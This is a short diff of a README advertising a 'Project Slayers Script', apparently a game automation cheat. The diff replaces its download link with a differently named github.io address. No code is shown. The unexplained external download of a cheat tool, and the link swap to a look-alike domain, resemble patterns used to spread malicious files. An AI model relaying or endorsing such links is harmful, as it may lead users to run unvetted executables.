@@ -2,7 +2,7 @@
 
 Enhance your Project Slayers experience with this reliable and easy-to-use script. Designed to automate combat sequences and streamline progression, this tool is perfect for players looking to improve efficiency and enjoy the game more.
 
-[![Download Project Slayers Script](https://img.shields.io/badge/Download-Project_Slayers_Script-blueviolet)](https://project-slayers-script.github.io/.github)
+[![Download Project Slayers Script](https://img.shields.io/badge/Download-Project_Slayers_Script-blueviolet)](https://projectslayers-downloadscript.github.io/.github/)
 
 ---
 
